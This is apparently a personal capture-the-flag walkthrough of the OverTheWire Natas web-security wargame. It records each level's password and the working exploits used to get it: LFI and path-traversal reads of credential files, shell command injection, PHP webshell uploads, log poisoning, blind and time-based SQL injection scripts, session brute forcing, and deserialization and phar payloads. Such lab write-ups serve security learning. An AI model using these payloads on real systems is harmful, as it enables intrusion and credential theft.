# Natas 2024.06.22

/etc/natas_webpass/natasX

## Level 0

```
Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

CTRL + U
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

Username: natas1 Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

URL: http://natas1.natas.labs.overthewire.org

## Level 1

```
CTRL + U
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

Username: natas2 Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

URL: http://natas2.natas.labs.overthewire.org

## Level 2

```
http://natas2.natas.labs.overthewire.org/files/users.txt

natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

Username: natas3 Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

URL: http://natas3.natas.labs.overthewire.org

## Level 3

```
http://natas3.natas.labs.overthewire.org/robots.txt

http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

Username: natas4 Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

URL: http://natas4.natas.labs.overthewire.org

## Level 4

```
find basic auth string

curl -H 'Authorization:Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/

The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

Username: natas5 Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

URL: http://natas5.natas.labs.overthewire.org

## Level 5

```
set cookie loggedin=1

The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

Username: natas6 Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

URL: http://natas6.natas.labs.overthewire.org

## Level 6

```
View sourcecode

http://natas6.natas.labs.overthewire.org/includes/secret.inc

$secret = "FOEIUWGHFEEUHOFUOIU";  <-- submit with this

The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

Username: natas7 Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

URL: http://natas7.natas.labs.overthewire.org

## Level 7

```
CRTL + U
LFI
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

Username: natas8 Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

URL: http://natas8.natas.labs.overthewire.org

## Level 8

```
View sourcecode

reverse

echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));

oubWYf2kBq  <-- submit with this

The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

Username: natas9 Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

URL: http://natas9.natas.labs.overthewire.org

## Level 9

```
View sourcecode

RCE

a;cat /etc/natas_webpass/natas10;ls

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

```

Username: natas10 Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

URL: http://natas10.natas.labs.overthewire.org

## Level 10

```
bypass filter： preg_match('/[;|&]/',$key)

a /etc/natas_webpass/natas11  <-- grep a-z

/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

Username: natas11 Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

URL: http://natas11.natas.labs.overthewire.org

## Level 11

```
setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
cookie data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

XOR reverse
text ^ key = cipherText
cipherText ^ key = text
text ^ cipherText = key

function xor_encrypt($str, $in) {
    $text = $str;
    $key = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$str=base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
$in=json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
echo xor_encrypt($str, $in);

eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

看上去加密的 key 像是 eDWo，然后用它加密需要的 cookie 数据:

```
function xor_encrypt($in) {
    $text = $in;
    $key = 'eDWo';
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$in=json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
echo base64_encode(xor_encrypt($in));

HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5

将这个cookie修改到浏览器中，然后在访问

curl -H 'Authorization:Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==' -b 'data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5' http://natas11.natas.labs.overthewire.org/

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

Username: natas12 Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

URL: http://natas12.natas.labs.overthewire.org

## Level 12

```

upload shell , bp intercept  filename can control: c54hky4d5n.jpg.php

------WebKitFormBoundarylScMiG0t4hOfWB4S

Content-Disposition: form-data; name="filename"

c54hky4d5n.jpg.php

------WebKitFormBoundarylScMiG0t4hOfWB4S

Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"

Content-Type: application/x-php

<?php system('cat /etc/natas_webpass/natas13');?>

trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

Username: natas13 Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

URL: http://natas13.natas.labs.overthewire.org

## Level 13

```
exif_imagetype($_FILES['uploadedfile']['tmp_name'])

需要追加文件头，变成jpeg格式 FF D8 FF E0

------WebKitFormBoundaryYhZxbq2rbm3kbNXS
Content-Disposition: form-data; name="filename"
px8jpk11xa.jpg.php
------WebKitFormBoundaryYhZxbq2rbm3kbNXS
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: image/jpeg
ÿØÿà<?php system('cat /etc/natas_webpass/natas14');?>

访问 http://natas13.natas.labs.overthewire.org/upload/ovhlpy6n50.php

z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

Username: natas14 Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

URL: http://natas14.natas.labs.overthewire.org

## Level 14

```
sql injection

1" or 1=1 -- 1

The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

Username: natas15 Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

URL: http://natas15.natas.labs.overthewire.org

## Level 15

根据提示, natas16 的密码应该在数据表中的 password 字段中。

```
bool sql injection

CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);

确定密码长度为32: username=natas16" and length(password)>=32 -- -
```

创建 python 脚本跑出 natas16 用户的密码(重点注意 mysq 查询时不区分大小写的问题，可以转换成 ascii 码来比较)：

```python
import string
import requests

chars = string.digits + string.ascii_letters
final = ''

for i in range(1, 33):
    for x in chars:
        username = 'natas16" and ascii(substr(password, {i}, 1))=ascii("{x}") -- -'.format(i=i, x=x)
        r = requests.get('http://natas15.natas.labs.overthewire.org', auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'), params={'username': username})

        if 'This user exists' in r.text:
            final += x
            print(final)
            break
print(final)
```

要稍微等待一段时间爆破密码.

Username: natas16 Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

URL: http://natas16.natas.labs.overthewire.org

## Level 16

```
bypass:
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

```
进行盲测，先找到 dictionary.txt 中的一个唯一值: Africans
然后输入 $(grep ^H /etc/natas_webpass/natas17)Africans  如果natas17是以H开头的，则会返回一个字符串,然后拼接Africans，这时 grep -i "xxxxxxAfricans" dictionary.txt 就不会有结果; 如果不是H开头的，则会返回空字符串，拼接Africans后还是Africans，然后grep 就会显示出Africans。
```

使用 python 进行爆破：

```python
import string
import requests

chars = string.digits + string.ascii_letters
final = ''

for i in range(1, 33):
    for x in chars:
        needle = '$(grep ^' + final + x + ' /etc/natas_webpass/natas17)Africans'
        r = requests.get('http://natas16.natas.labs.overthewire.org', auth=('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'),
                         params={'needle': needle, 'submit': 'Search'})

        if 'Africans' not in r.text:
            final += x
            print(final)
            break

print(final)

EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

Username: natas17 Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

URL: http://natas17.natas.labs.overthewire.org

## Level 17

sql 注入进行了修改，变成了无任何回显，所以需要时间盲注：

```php
$res = mysqli_query($link, $query);
if($res) {
if(mysqli_num_rows($res) > 0) {
    //echo "This user exists.<br>";
} else {
    //echo "This user doesn't exist.<br>";
}
} else {
    //echo "Error in query.<br>";
}
```

时间盲注爆破(时间要延长点，否则可能因为网络延迟不准确):

```python
import string
import requests

chars = string.digits + string.ascii_letters

auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

dicts = ''

for x in chars:
    username = 'natas18" and if(password like binary "%{x}%", sleep(10), 1) -- -'.format(x=x)
    print(username)
    r = requests.get('http://natas17.natas.labs.overthewire.org/index.php', auth=auth, params={'username': username})

    if r.elapsed.total_seconds() >= 10:
        dicts += x
        print(dicts)

print('\nDicts -> ' + dicts)

final = ''

for i in range(1, 33):
    for x in dicts:
        username = 'natas18" and ascii(substr(password, {i}, 1))=ascii("{x}") and sleep(10) -- -'.format(i=i, x=x)
        r = requests.get('http://natas17.natas.labs.overthewire.org/index.php', auth=auth, params={'username': username})

        if r.elapsed.total_seconds() >= 10:
            final += x
            print(final.ljust(32, '*'))
            break

print('\nResult -> ' + final)
```

Username: natas18 Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

URL: http://natas18.natas.labs.overthewire.org

## Level 18

遍历 PHPSESSIONID，得到 admin 的 cookie 就能得到密码。

```python
import requests

for i in range(1, 641):
    cookie = {'PHPSESSID': str(i)}
    req = requests.get(url='http://natas18.natas.labs.overthewire.org/', auth=('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'), cookies=cookie)

    if 'You are an admin' in req.text:
        print(req.text)
        break
```

Username: natas19 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

URL: http://natas19.natas.labs.overthewire.org

## Level 19

PHPSESSIONID 已经升级，变成了 3437382d61646d696e, 18 位，经过 hex to ascii 转换 经过测试发现 478-admin, 前面的数字是三位随机数-admin，所以需要按照这个构造去爆破 sessionid：

```python
import requests

auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for i in range(1, 641):
    cookie = {'PHPSESSID': (str(i) + '-admin').encode().hex()}
    req = requests.get(url='http://natas19.natas.labs.overthewire.org/', auth=auth, cookies=cookie)

    if 'You are an admin' in req.text:
        print(req.text)
        break
```

Username: natas20 Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

URL: http://natas20.natas.labs.overthewire.org

## Level 20

核心代码:

```php
debug("Saving in ". $filename);
ksort($_SESSION);
foreach($_SESSION as $key => $value) {
    debug("$key => $value");
    $data .= "$key $value\n";
}
file_put_contents($filename, $data);

debug("Reading from ". $filename);
$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
$parts = explode(" ", $line, 2);
if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}

key value\nkey value\n

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}
通过上面的代码把 \nadmin 1 这个 key value 注入到session中.
```

攻击代码:

```python
import requests

proxys = {'http': '101.1.0.8:7890'}
auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
url = 'http://natas20.natas.labs.overthewire.org'
req = requests.post(url=url, auth=auth, params={'name': 'admin\nadmin 1'}, proxies=proxys)
cookies = req.cookies.get_dict()
req = requests.get(url=url, auth=auth, cookies=cookies)
print(req.text)
```

Username: natas21 Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

URL: http://natas21.natas.labs.overthewire.org

## Level 21

根据页面提示，下面 2 个链接的 session 是共同的:

```
http://natas21-experimenter.natas.labs.overthewire.org/index.php 利用此页面的提交，增加admin=1字段，提交后会写到session中，将获得的sessionid,替换 http://natas21.natas.labs.overthewire.org/ 中的sessionid ，刷新页面就得到了密码

d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

Username: natas22 Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

URL: http://natas22.natas.labs.overthewire.org

## Level 22

```php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");  <-- 这里会跳转
    }
}

脚本代码从上向下执行，这里的代码还是会执行到底
<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

使用bp repeater，在访问参数中添加 revelio=1 就得到了返回的302重定向代码，但是在html中也显示了password的内容

dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```

Username: natas23 Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

URL: http://natas23.natas.labs.overthewire.org

## Level 23

```php
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}

输入密码: 100000iloveyou 可以同时绕过strstr 和 > 的限制
```

Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

URL: http://natas24.natas.labs.overthewire.org

## Level 24

```
!strcmp($_REQUEST["passwd"],"<censored>") 这里需要绕过，利用passwd[] 作为参数名就可以绕过，strcmp 报错就会返回false

ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

URL: http://natas25.natas.labs.overthewire.org

## Level 25

```
查看源代码后，发现可以利用HTTP_USER_AGENT 将 webshell 写入日志文件，然后文件包含日志文件，执行获得密码

$filename=str_replace("../","",$filename); 这里的文件过滤可以使用 ....//进行绕过，没有循环过滤完全
```

先注入 webshell：

```
GET /?lang=natas_webpass HTTP/1.1
User-Agent: AAAA<?php system('cat /etc/natas_webpass/natas26');?>
```

在执行获得密码：

```
GET /?lang=....//....//....//....//....//./var/www/natas/natas25/logs/natas25_0mpk3g5g3dtk6m7kehsbc114tp.log HTTP/1.1
User-Agent: AAAA

cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

Username: natas26 Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

URL: http://natas26.natas.labs.overthewire.org

## Level 26

利用写入 cookie，来触发 Logger 的 php 反序列化在 web 目录中写入 webshell，读取文件

```php

编辑 shell.php 文件内容如下(需要将php shell 写入到exitMsg，写入initMsg中时不能写入到php文件中)：

<?php
class Logger {
    private $logFile = '/var/www/natas/natas26/img/apl.php';
    private $initMsg = 'X\n';
    private $exitMsg = 'A<?php system("cat /etc/natas_webpass/natas27");?>\n';
}
$obj = new Logger();
print base64_encode(serialize($obj));
?>

php shell.php

Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvYXBsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjM6IlhcbiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUyOiJBPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTs/PlxuIjt9
```

将上面得到的 base64 值，替换到 cookie 中，然后访问，触发写入文件，下面的显示说明序列化已经触发：

```
Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105
```

最后访问 http://natas26.natas.labs.overthewire.org/img/apl.php 得到密码: u3RRffXjysjgwFU6b9xa23i6prmUsYne

Username: natas27 Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

URL: http://natas27.natas.labs.overthewire.org

## Level 27

sql 绕过:

```
username 在数据库中是64位长度。

$user=mysqli_real_escape_string($link, substr($usr, 0, 64));  这里只去了前64个字符进行了关键字转义

name: natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00x
pass: 123

Welcome natas28!
Here is your data:
Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )
```

Username: natas28 Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

URL: http://natas28.natas.labs.overthewire.org

## Level 28

```
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D

后面的query参数像是加密的信息。

访问 http://natas28.natas.labs.overthewire.org/search.php/?query=

Notice: Uninitialized string offset: -1 in /var/www/natas/natas28/search.php on line 59
Zero padding found instead of PKCS#7 padding

证明了使用PKCS#7
```

https://ithelp.ithome.com.tw/articles/10339704 参照的这个方案进行的解决

Username: natas29 Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

URL: http://natas29.natas.labs.overthewire.org

## Level 29

```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2 可能存在文件包含，或者是文件读取时带入其他命令执行RCE

尝试进行探测：
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls+%00
显示了当前文件夹中的文件列表, %00 用于截断后面的 .txt
index.pl
perl underground 2.txt
perl underground 3.txt
perl underground 4.txt
perl underground 5.txt
perl underground.txt

看看index.pl 中什么内容
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl+%00

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

需要使用"拼接绕过 ~/natas/

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/na%22%22tas30+%00

WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

Username: natas30 Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

URL: http://natas30.natas.labs.overthewire.org

## Level 30

先查看源码，看实现逻辑。

```
my $query="Select * FROM users where username =". $dbh->quote(param('username')) ." and password =".$dbh->quote(param('password'));

quote 可以用传入多个同名的参数进行双引号包裹绕过, 第二个参数决定如何引用，如果第二个参数为数字，则返回一个没用双引号包裹的值。

username=natas31&password='xx'+or+1=1--+-&password=4

m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```

Username: natas31 Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

URL: http://natas31.natas.labs.overthewire.org

## Level 31

```
while (<$file>)  这里可能存在RCE，当file为ARGV时，运算符<>将遍历所有的的参数值，将每个值插入到open()的调用中，这样我们就能在POST请求中打开并打印服务器上包含的任何文件内容。在调用open()函数是，它只是将文件描述符打开到指定的文件路径，除非‘|’字符被附加到字符串末尾，在这种情况下open（）不仅会打开文件，还会执行文件。

使用bp抓包进行修改:
/index.pl?cat%20/etc/natas_webpass/natas32%20|

------WebKitFormBoundaryJylzpAFAV8LpinZU
Content-Disposition: form-data; name="file"
Content-Type: text/csv
ARGV
------WebKitFormBoundaryJylzpAFAV8LpinZU
Content-Disposition: form-data; name="file"; filename="text.csv"
Content-Type: text/csv
ARGV
------WebKitFormBoundaryJylzpAFAV8LpinZU
Content-Disposition: form-data; name="submit"
Upload
------WebKitFormBoundaryJylzpAFAV8LpinZU--
```

Username: natas32 Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

URL: http://natas32.natas.labs.overthewire.org

## Level 32

```
POST /index.pl?./getpassword%20| HTTP/1.1
------WebKitFormBoundary57MeBt5i4AQz239x
Content-Disposition: form-data; name="file"
Content-Type: text/csv
ARGV
------WebKitFormBoundary57MeBt5i4AQz239x
Content-Disposition: form-data; name="file"; filename="text.csv"
Content-Type: text/csv
ARGV
------WebKitFormBoundary57MeBt5i4AQz239x
Content-Disposition: form-data; name="submit"
Upload
------WebKitFormBoundary57MeBt5i4AQz239x--

2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```

Username: natas33 Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

URL: http://natas33.natas.labs.overthewire.org

## Level 33

```
 if(md5_file($this->filename) == $this->signature){
    echo "Congratulations! Running firmware update: $this->filename <br>";
    passthru("php " . $this->filename);
}

这里能够根据文件名执行命令，需要使用 phar

在kali上创建p.php内容如下:
<?php system("cat /etc/natas_webpass/natas34");?>

先上传，抓包修改文件名为 p.php 否则就是一个随机的无法后续利用的随机数名字 <input type="hidden" name="filename" value="otckda1q5h4smob75dpsne66m7" />

创建phar.php内容如下:
<?php
class Executor{
    private $filename = 'p.php';
    private $signature = True;
    private $init=False;
}
$obj = new Executor();

$phar = new Phar('t.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER();?>');
$phar->setMetadata($obj);                     <-- 这里是攻击点，注入自定义的序列化信息，在执行时就会进行反序列化操作，执行用户特定的rce
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>

php -i | grep phar 必须为Off才行

然后执行 php -d phar.readonly=Off phar.php

生成了t.phar ，然后用此文件继续上传，并且修改文件名 phar://t.phar ， 必须有phar:// 前缀为协议，才能触发 md5_file($this->filename) 解析执行

j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```

Username: natas34 Password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY

URL: http://natas34.natas.labs.overthewire.org

Congratulations! You have reached the end... for now.
